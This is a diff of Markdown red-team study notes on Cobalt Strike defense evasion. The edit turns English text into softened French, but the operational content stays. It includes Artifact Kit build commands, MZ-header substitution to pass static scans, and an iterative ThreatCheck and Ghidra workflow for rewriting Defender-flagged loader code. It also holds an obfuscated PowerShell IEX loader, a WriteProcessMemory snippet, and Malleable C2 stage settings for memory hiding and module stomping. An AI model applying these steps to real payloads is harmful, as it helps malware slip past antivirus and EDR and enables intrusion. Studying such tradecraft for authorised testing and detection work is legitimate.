@@ -1,24 +1,24 @@
-# Defense Evasion
+# Defense Evasion — Comprendre les contrôles de détection
 
-* Compiled Artifacts
-* Script Artifacts
-* Beacon Memory
-* Beacon Command Behaviour
-* Blending Post-Ex
-* Command-Line Detections
+* Artifacts compilés
+* Artifacts de scripts
+* Mémoire du Beacon
+* Comportement des commandes Beacon
+* Cohérence des opérations Post-Exploitation
+* Détections sur les lignes de commande
 
 ---
 
-## Named Pipe Reference — Two Separate Settings
+## Named Pipes — Deux paramètres distincts
 
-> **Exam trap:** There are TWO different named pipe settings. They control completely different things.
+> **Attention :** le listener SMB et les opérations post-exploitation disposent de deux paramètres de named pipes différents.
 
-| Pipe | Where configured | Lab default | Exam day |
+| Usage | Configuration | Valeur du lab | Remarque |
 |------|-----------------|-------------|----------|
-| **SMB C2 comms** | CS Listener settings (GUI) | `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337` | **Create a CUSTOM name — never use TSVCPIPE-*** |
-| **Fork&run output** | `post-ex.pipename` in Malleable C2 profile | `dotnet-diagnostic-#####, ########-####-####-####-############` | Use this value — OPSEC-safe |
+| **Communications C2 SMB** | Paramètres du listener dans Cobalt Strike | `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337` | Nom défini dans les paramètres du listener |
+| **Sortie fork-and-run** | `post-ex.pipename` dans le Malleable C2 Profile | `dotnet-diagnostic-#####, ########-####-####-####-############` | Valeur utilisée dans le lab — aucune garantie de non-détection |
 
-### SMB Listener — Exam-Safe Pipename Patterns
+### Listener SMB — Formats de named pipes
 
 ```
 # Good — blends with legitimate Windows named pipes:
@@ -33,7 +33,7 @@ postex_*
 MSSE-*-server
 ```
 
-### `post-ex.pipename` Wildcard Format
+### Format des caractères génériques de `post-ex.pipename`
 
 ```
 set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
@@ -44,48 +44,48 @@ set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
 
 ---
 
-## Build new artifacts    
+## Compiler de nouveaux artifacts    
 
 ```
 ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
 ```
 
-### Parameter Reference
+### Signification des paramètres
 
 ```
 ./build.sh <technique> <allocator> <magic_mz_x86> <magic_mz_x64> <rdll_x86> <rdll_x64> <stack_spoof> <output_dir>
 ```
 
-| # | Parameter | Value in Example | Purpose |
+| # | Paramètre | Valeur d’exemple | Fonction |
 |---|-----------|-----------------|---------|
-| 1 | `technique` | `mailslot` | IPC method used to pass shellcode into the artifact. Options: `mailslot`, `pipe`, `readfile` |
-| 2 | `allocator` | `VirtualAlloc` | Memory allocation method for shellcode. Options: `VirtualAlloc`, `MapViewOfFile`, `HeapAlloc` |
-| 3 | `magic_mz_x86` | `351363` | Replaces the `MZ` (4D5A) DOS header magic bytes in x86 artifact — defeats static sig detection. Patched back at runtime |
-| 4 | `magic_mz_x64` | `0` | Same as above for x64. `0` = use default (no substitution) |
-| 5 | `rdll_x86` | `false` | Use Reflective DLL staging for x86 payload |
-| 6 | `rdll_x64` | `false` | Use Reflective DLL staging for x64 payload |
-| 7 | `stack_spoof` | `none` | Call stack spoofing. Options: `none` or a spoofing technique name |
-| 8 | `output_dir` | `/mnt/c/Tools/cobaltstrike/custom-artifacts` | Where compiled artifacts land — load this dir in CS via `Script Manager` / `artifact.cna` |
+| 1 | `technique` | `mailslot` | Méthode IPC utilisée pour transférer les données au module. Options : `mailslot`, `pipe`, `readfile` |
+| 2 | `allocator` | `VirtualAlloc` | Méthode d’allocation mémoire. Options : `VirtualAlloc`, `MapViewOfFile`, `HeapAlloc` |
+| 3 | `magic_mz_x86` | `351363` | Remplace les octets magiques `MZ` (4D5A) de l’en-tête DOS x86 ; ils peuvent être restaurés à l’exécution |
+| 4 | `magic_mz_x64` | `0` | Paramètre équivalent pour x64 ; `0` conserve la valeur par défaut |
+| 5 | `rdll_x86` | `false` | Active le chargement Reflective DLL du payload x86 |
+| 6 | `rdll_x64` | `false` | Active le chargement Reflective DLL du payload x64 |
+| 7 | `stack_spoof` | `none` | Paramètre de pile d’appels. Options : `none` or a spoofing technique name |
+| 8 | `output_dir` | `/mnt/c/Tools/cobaltstrike/custom-artifacts` | Dossier de sortie des artifacts, accessible via `Script Manager` et `artifact.cna` |
 
-### Technique Options
+### Options de la technique
 
-| Technique | How it works | OPSEC |
+| Technique | Fonctionnement | OPSEC |
 |-----------|-------------|-------|
-| `mailslot` | Shellcode passed via Windows mailslot IPC | Less commonly signatured |
-| `pipe` | Named pipe IPC | Common — more detection rules |
-| `readfile` | Reads shellcode from a temp file | OPSEC-CAUTION — writes to disk |
+| `mailslot` | Transfert des données par IPC Windows mailslot | Moins fréquent dans certains référentiels de signatures |
+| `pipe` | Communication par named pipe | Fréquent ; plusieurs règles de détection existent |
+| `readfile` | Lit le contenu depuis un fichier temporaire | OPSEC-CAUTION — écrit sur le disque |
 
-### Allocator Options
+### Options d’allocation mémoire
 
-| Allocator | OPSEC note |
+| Allocateur | Remarque OPSEC |
 |-----------|-----------|
-| `VirtualAlloc` | Most common — heavily monitored by EDR hooks |
-| `MapViewOfFile` | File-backed mapping — less detected but still monitored |
-| `HeapAlloc` | Heap-based — can evade RWX page detection |
+| `VirtualAlloc` | Très utilisé et souvent surveillé par les EDR |
+| `MapViewOfFile` | Mapping mémoire adossé à un fichier ; surveillance toujours possible |
+| `HeapAlloc` | Allocation sur le tas, au comportement différent des pages RWX |
 
-### magic_mz Explained
+### Comprendre `magic_mz`
 
-Every Windows PE file starts with bytes `4D 5A` (hex) — ASCII **MZ** — at offset 0x00:
+Les fichiers PE Windows débutent normalement par les octets hexadécimaux `4D 5A`, correspondant à **MZ** à l’offset `0x00` :
 
 ```
 Offset 0x00:  4D 5A 90 00 03 00 ...
@@ -93,7 +93,7 @@ Offset 0x00:  4D 5A 90 00 03 00 ...
               M  Z   ← Defender looks for this at byte 0
 ```
 
-Defender and AV use this as a static signature — anything starting with `MZ` gets flagged as a PE and scrutinised. The `magic_mz` parameter replaces those bytes before the artifact is written to disk/memory:
+Les en-têtes PE sont des informations analysables par les moteurs antivirus. Dans ce scénario, `magic_mz` modifie la valeur de l’en-tête de l’artifact :
 
 ```
 351363 decimal = 0x055C03 hex → first two bytes: 03 5C
@@ -101,24 +101,24 @@ Defender and AV use this as a static signature — anything starting with `MZ` g
 On disk: 03 5C ...  ← looks like garbage, not a PE → passes static scan
 ```
 
-At runtime the artifact's own stub patches them back before execution:
+Le code du lab restaure les octets d’origine lors de l’exécution :
 
 ```
 03 5C ...  →  4D 5A ...  (MZ restored → valid PE loaded and executed)
 ```
 
-| Stage | Bytes at offset 0 | What Defender sees |
+| Étape | Octets à l’offset 0 | Observation possible |
 |-------|-------------------|-------------------|
-| On disk / initial scan | `03 5C` (custom value) | Not a PE — passes static scan |
-| At runtime (self-patched) | `4D 5A` (MZ restored) | Executable running in memory |
+| Sur le disque / analyse initiale | `03 5C` (custom value) | En-tête PE non reconnu sous sa forme habituelle |
+| Pendant l’exécution (en-tête restauré) | `4D 5A` (MZ restored) | Exécutable présent en mémoire |
 
-`magic_mz_x64 = 0` means no substitution for x64 — real MZ header left intact. Use a non-zero value for both archs when Defender is active.
+`magic_mz_x64 = 0` conserve l’en-tête MZ d’origine sur x64. Les autres valeurs modifient le comportement étudié dans le lab.
 
 ---
 
-**tip:** `mailslot` + `HeapAlloc` + custom `magic_mz` values is the quietest combination. Avoid `readfile` (disk write) and `VirtualAlloc` with RWX pages (EDR hook bait).
+**Remarque :** `mailslot`, `HeapAlloc` et `magic_mz` correspondent à des options de l’Artifact Kit ; leur visibilité réelle dépend de l’environnement et des contrôles EDR.
 
-After build, load the aggressor script:
+Après la compilation, charger le script Aggressor :
 
 ```
 Cobalt Strike → Script Manager → Load → <output_dir>/artifact.cna
@@ -130,7 +130,7 @@ Cobalt Strike → Script Manager → Load → <output_dir>/artifact.cna
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe" 
 ```  
 
->Identified bits that is detected by Defender and a HEX offset provided.
+>ThreatCheck indique les segments signalés par Defender et, lorsqu’il est disponible, un offset hexadécimal.
 
 ## Ghidra  
 
@@ -138,21 +138,21 @@ C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltst
 ghidraRun.bat
 ```  
 
-### Ghidra Steps:  
+### Étapes d’analyse dans Ghidra :  
 
-1. New Project  
+1. Créer un projet  
 
 <img src="/images/ghidra01.png" width=600>  
 
-2. Import File  
+2. Importer le fichier  
 
 <img src="/images/ghidra02.png" width=400>  
 
-3. Double Click to open imported file
+3. Ouvrir le fichier importé par double-clic
 
 <img src="/images/ghidra03.png" width=400>  
 
-4. Analyze the file, yes all. Use offset provided by ***ThreatCheck*** and copy to Navigation Menu - Go to ...  
+4. Lancer l’analyse du fichier, puis utiliser l’offset de ThreatCheck dans le menu de navigation **Go to**.  
 
 ```
 file(0x9CF)
@@ -160,65 +160,65 @@ file(0x9CF)
 
 <img src="/images/ghidra04.png" width=600>  
 
-5. See the reversed code decompiled on right window that is detected by Defender Antivirus.  
+5. Consulter le code décompilé dans le panneau de droite et comparer avec les zones détectées.  
 
 <img src="/images/ghidra05.png" width=800>  
 
-6. Back to output from ***ThreatCheck***, copy last row of HEX bytes. In Ghidra open `Search Menu - Memory`. Then paste HEX bytes and click found memory location to take us to detected bit.  
+6. Relever les octets hexadécimaux de ThreatCheck, puis les rechercher dans **Search > Memory** de Ghidra pour identifier la zone concernée.  
 
 <img src="/images/ghidra06.png" width=700> 
 
-7. The function in this case for loop is confirmed to be location detected by antivirus. Using this identified function we go into our source code.
+7. Dans l’exemple du lab, la zone correspond à une boucle du code source. Il faut établir la correspondance entre code décompilé et fichier d’origine.
 
 <img src="/images/ghidra07.png" width=600> 
 
-8. Open Visual Code. In menu Edit - Find in Files, type string to search for above identified function.  
+8. Dans Visual Studio Code, utiliser **Edit > Find in Files** pour retrouver la fonction concernée.  
 
 <img src="/images/ghidra08.png" width=600> 
 
-9. Replace the identified function loop or piece of code with alternative approach to bypass defender detection. Example a backwards while loop.  
+9. Le lab compare deux variantes d’une boucle afin d’étudier l’effet de la compilation sur les signatures détectées.  
 
->Now repeat above by start with building new set of artifacts templates, and running ***ThreatCheck*** again.    
->Repeat until ***ThreatCheck*** shows no threat found.
+>Compiler de nouveau les templates de l’Artifact Kit, puis relancer ThreatCheck pour comparer les résultats.    
+>Noter chaque résultat de ThreatCheck et le comparer aux analyses précédentes.
 
-### ThreatCheck → Ghidra — Practical Iteration Workflow
+### ThreatCheck et Ghidra — Méthode d’analyse du lab
 
-**Full cycle (exam-day steps):**
+**Déroulement du contrôle :**
 
-**1. ThreatCheck — get the flagged offset:**
+**1. ThreatCheck — relever l’offset signalé :**
 ```cmd
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
 # Output: Byte[]: 0x00004C20
 #         HEX: 31 C0 48 FF C8 ...   ← these are the exact bytes Defender matched
 ```
-No output = clean. Any output = signature found at that hex offset.
+L’absence de sortie ne prouve pas l’absence de détection ; une sortie signale une zone à examiner.
 
-**2. Ghidra — navigate to offset:**
+**2. Ghidra — accéder à l’offset :**
 ```
 Window → Go To
 Enter: 0x4C20    ← use the hex offset from ThreatCheck (must prefix with 0x)
 ```
-The disassembly view jumps to the flagged bytes. The decompiler panel (right) shows the C-equivalent code.
+La vue désassemblée présente les octets concernés ; le décompilateur affiche une représentation proche du C.
 
-**3. Identify the flagged loop construct:**
-Look for a `for`-loop in the decompiler view. This is the XOR decryption loop in `patch.c`:
+**3. Identifier la boucle concernée :**
+Dans l’exemple, la zone correspond à une boucle `for` de traitement XOR dans `patch.c` :
 ```c
 // Signatured — Defender has this bytecode pattern flagged:
 for ( int x = 0; x < length; x++ ) {
     buffer[x] = buffer[x] ^ key[x % 8];
 }
 ```
-There are two instances in `patch.c`:
-- **Line ~45** — service executable (`.svc.exe`) payload loop
-- **Line ~116** — standard executable payload loop
+Deux occurrences figurent dans `patch.c` :
+- **Line ~45** — boucle du binaire service `.svc.exe`
+- **Line ~116** — boucle de l’exécutable standard
 
-**4. Map to source and change loop direction in VSCode:**
+**4. Identifier la portion correspondante dans VS Code :**
 ```
 VSCode: File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
 Open: src-common\patch.c
 ```
 
-**Line ~45 replacement:**
+**Exemple à la ligne ~45 :**
 ```c
 // NEW — backward while-loop (compiles to different bytecode):
 int x = length;
@@ -227,83 +227,83 @@ while ( x-- ) {
 }
 ```
 
-**Line ~116 replacement:**
+**Exemple à la ligne ~116 :**
 ```c
 int x = length;
 while ( x-- ) {
     *( (char *)ptr + x ) = *( (char *)buffer + x ) ^ key[ x % 8 ];
 }
 ```
-> Comment out the old `for`-loop lines rather than deleting — easy rollback if the build breaks.
+> Conserver les versions précédentes dans le suivi Git afin de pouvoir comparer les changements.
 
-**5. Rebuild:**
+**5. Recompiler :**
 ```bash
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
 ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
 ```
 
-**6. ThreatCheck again:**
+**6. Relancer ThreatCheck :**
 ```cmd
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
 ```
-- No output → **CLEAN** — load `artifact.cna` and move on.
-- New offset output → Defender found a *different* signature → repeat from Step 2 with the new offset.
+- Aucune sortie → le test n’a pas signalé de signature sur cet échantillon.
+- Nouvel offset → une autre portion est signalée ; comparer les résultats du test.
 
-**Typical iteration count:** 2–3 cycles. Each cycle removes one Defender signature.
+**Observations du lab :** plusieurs compilations et contrôles sont présentés ; leur nombre dépend des échantillons.
 
-**What the backward while-loop does:** The same XOR operation executes, but the compiler emits different opcodes for a backward-counting `while(x--)` vs a forward `for(x=0; x<n; x++)`. Defender's signature matches the specific opcode sequence from the forward loop — the backward loop breaks that match without changing the decrypt result.  
+**Différence de code compilé :** une boucle `while` et une boucle `for` équivalentes peuvent produire des séquences d’instructions différentes. Le lab étudie cette variation dans les résultats d’analyse de ThreatCheck.  
 
-## Script Artifacts Kit  
+## Resource Kit — Scripts  
 
->Building a new set of resources, without changing anything  
+>Compiler une nouvelle version des ressources sans modification du code.  
 
 ```
 ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
 ```  
 
->Scanning template with ThreatCheck's AMSI engine  
+>Analyser le template à l’aide du mode AMSI de ThreatCheck.  
 
 ```ps1
 .\C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
 ```
 
->Based on ThreatCheck output, simple String concatenation attempt in source code change.  
+>Dans le lab, comparer les résultats après une modification de concaténation de chaînes.  
 
 ```ps1
 ('Syst'+'em.dll')
 ```  
 
->ThreatCheck next detection, shows marshal.copy method flagged and replace with native write process memory API.  
+>L’analyse signale ensuite l’utilisation de `Marshal.Copy` ; le lab présente une variante basée sur une API mémoire native.  
 
 ```ps1
 $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
 $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
 ```  
 
->ThreatCheck misses different parts of code evaluation, use ***obfuscation***  
+>Les contrôles de ThreatCheck ne représentent pas toutes les méthodes de détection ; une autre variante du script est présentée.  
 >[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)  
 
->Set the script block to be that of `compress.ps1` content.  
+>Le bloc suivant porte sur le contenu de `compress.ps1`.  
 
 ```
 Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
 ```  
 
->token obfuscations result output:  
+>Exemple de sortie de la transformation de tokens :  
 
 ```
 SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
 ```  
 
->Overwrite the content in `compress.ps1`, save the changes, then host and test a new payload.  
+>Le scénario poursuit avec une version modifiée de `compress.ps1`, suivie d’une nouvelle compilation et analyse.  
 
-## Beacon Memory
+## Mémoire du Beacon
 
-Each payload artifact (`.exe`, `.dll`, `.ps1`) injects Beacon shellcode — a loader + DLL package. AV products perform memory scans post-execution. Detections carry the `sms` postfix in Defender alerts (memory scan indicator).
+Les artifacts `.exe`, `.dll` et `.ps1` du lab chargent le Beacon en mémoire. Les antivirus peuvent analyser la mémoire après exécution ; les alertes peuvent inclure des indicateurs de scan mémoire.
 
-### RWX Memory — Remove the Red Flag
+### Mémoire RWX — comprendre le risque de détection
 
-Default: Beacon allocates a single `PAGE_EXECUTE_READWRITE` (RWX) region. Native apps don't use RWX (exception: PS/.NET) — it's a red flag.
+L’allocation d’une région `PAGE_EXECUTE_READWRITE` (RWX) peut constituer un indicateur surveillé. Certaines applications légitimes utilisent également ce type de pages.
 
 ```
 stage {
@@ -313,9 +313,9 @@ stage {
 }
 ```
 
-### DLL Headers — Remove PE Fingerprint
+### En-têtes DLL — signature PE en mémoire
 
-Default: PE headers (DOS + NT headers) loaded into memory. Not needed at runtime — their presence fingerprints a PE in memory.
+Les en-têtes PE (DOS et NT) restent identifiables en mémoire. Leur présence constitue une caractéristique analysable par les outils de sécurité.
 
 ```
 stage {
@@ -323,11 +323,11 @@ stage {
 }
 ```
 
-### Module Stomping — Back Beacon with a Legit Module
+### Module Stomping — relation avec un module chargé
 
-Problem: Beacon memory region has no backing module on disk → anomaly visible in System Informer's "use" column.
+**Contexte :** une région mémoire sans fichier module correspondant sur disque peut apparaître comme une anomalie dans les outils d’inspection.
 
-Fix: Map a legit DLL from disk, overwrite with Beacon → appears backed by a legitimate module.
+Le lab décrit le mapping d’une DLL et l’observation de son association aux régions mémoire.
 
 ```
 stage {
@@ -336,11 +336,11 @@ stage {
 }
 ```
 
-Pick from `C:\Windows\System32\` — find a DLL ≥ 512KB. Most of the original PE remains; Beacon is mapped over the sections.
+Les exemples utilisent des DLL de `C:\Windows\System32\`. Le comportement dépend de la taille, des sections PE et de leur mapping.
 
-### String Replacement — Strip Detectable Beacon Strings
+### Chaînes de caractères dans le Beacon
 
-Export raw Beacon DLL via Aggressor to find signatured strings:
+Examiner la DLL Beacon brute pour identifier les chaînes qu’elle contient :
 
 ```javascript
 // beacon.cna — dump raw DLL via BEACON_RDLL_GENERATE hook
@@ -357,7 +357,7 @@ on BEACON_RDLL_GENERATE {
 strings beacon_raw.x64.dll | less
 ```
 
-Replace in Malleable C2 stage block:
+Le scénario présente les paramètres du bloc `stage` du Malleable C2 Profile :
 
 ```
 stage {
@@ -372,9 +372,9 @@ stage {
 }
 ```
 
-> **WARNING:** Do NOT replace strings used by Beacon's internal web server. These support `powershell-import` / `powerpick` / `psinject` workflows. Breaking HTTP compliance silently breaks post-ex commands.
+> **Attention :** certaines chaînes sont nécessaires au serveur web interne du Beacon et aux fonctions `powershell-import`, `powerpick` et `psinject`. Leur modification peut empêcher ces commandes de fonctionner.
 
-### Recommended `stage` Block (Exam Template)
+### Exemple de bloc `stage` du lab
 
 ```
 stage {
@@ -392,51 +392,51 @@ stage {
 
 ---
 
-## Beacon Command Behaviour — OPSEC Classes
+## Comportement des commandes Beacon — Catégories OPSEC
 
-### Command Classes
+### Catégories de commandes
 
-| Class | How It Works | OPSEC |
+| Catégorie | Fonctionnement | OPSEC |
 |-------|-------------|-------|
-| **Housekeeping** | Client-side or simple beacon task | Minimal |
-| **API-only** | Native Windows APIs in beacon thread | SAFE — no new process |
-| **Inline (BOF)** | Compiled C runs in beacon thread, cleared after | SAFE — no new thread |
-| **Fork & Run (spawn)** | New sacrificial process → inject shellcode → named pipe output | CAUTION — new proc + thread + pipe |
-| **Fork & Run (explicit)** | Inject into existing process | CAUTION — new thread + pipe |
-| **Process execution** | Runs arbitrary process on disk | UNSAFE — child process visible |
-| **Service creation** | Creates Windows service | UNSAFE — Event 7045 |
+| **Housekeeping** | Action côté client ou tâche simple du Beacon | Minimal |
+| **API-only** | API Windows exécutées dans le thread du Beacon | SAFE — sans nouveau processus |
+| **Inline (BOF)** | Code C compilé exécuté dans le thread du Beacon | SAFE — sans nouveau thread |
+| **Fork & Run (spawn)** | Création d’un processus temporaire avec sortie via named pipe | CAUTION — nouveau processus, thread et named pipe |
+| **Fork & Run (explicit)** | Exécution dans un processus existant | CAUTION — nouveau thread et named pipe |
+| **Process execution** | Exécution d’un processus depuis le disque | UNSAFE — processus enfant observable |
+| **Service creation** | Crée un service Windows | UNSAFE — Event 7045 |
 
-### API-Only (OPSEC-SAFE)
+### API Windows seules (OPSEC-SAFE)
 ```
 pwd  cd  ls  download  upload  getuid  make_token
 steal_token  rev2self  kill  exit
 ```
 
-### BOF / Inline (OPSEC-SAFE — runs in beacon thread, no new thread)
+### BOF / Inline (OPSEC-SAFE — runs in beacon thread, sans nouveau thread)
 ```
 clipboard  getsystem  kerberos_ticket_use  reg  runasadmin uac-cmstplua
 jump psexec (BOF component)
 ```
 
-> BOF memory allocation/cleanup controlled by `process-inject` block in Malleable C2.
+> L’allocation et la libération de mémoire des BOF dépendent notamment des paramètres `process-inject`.
 
-### Fork & Run — Spawn Only (OPSEC-CAUTION)
+### Fork-and-run — Création de processus (OPSEC-CAUTION)
 ```
 execute-assembly    # .NET assembly in memory via sacrificial process
 powerpick           # Unmanaged PowerShell — no powershell.exe, but spawns spawnto proc
 ```
 
-### Fork & Run — Explicit Only (OPSEC-CAUTION)
+### Fork-and-run — Processus explicite (OPSEC-CAUTION)
 ```
 psinject            # powerpick into a specified existing process
 ```
 
-### Fork & Run — Both Modes
+### Fork-and-run — Deux modes
 ```
 portscan  keylogger  printscreen  desktop  mimikatz
 ```
 
-### Process Execution (OPSEC-UNSAFE)
+### Exécution de processus (OPSEC-UNSAFE)
 ```
 execute    # No output
 run        # With output
@@ -446,7 +446,7 @@ shell      # Via cmd.exe
 powershell # Via powershell.exe
 ```
 
-### Service Creation (OPSEC-UNSAFE — Event 7045)
+### Création de service (OPSEC-UNSAFE — événement 7045)
 ```
 elevate svc-exe
 jump psexec / psexec64 / psexec_psh
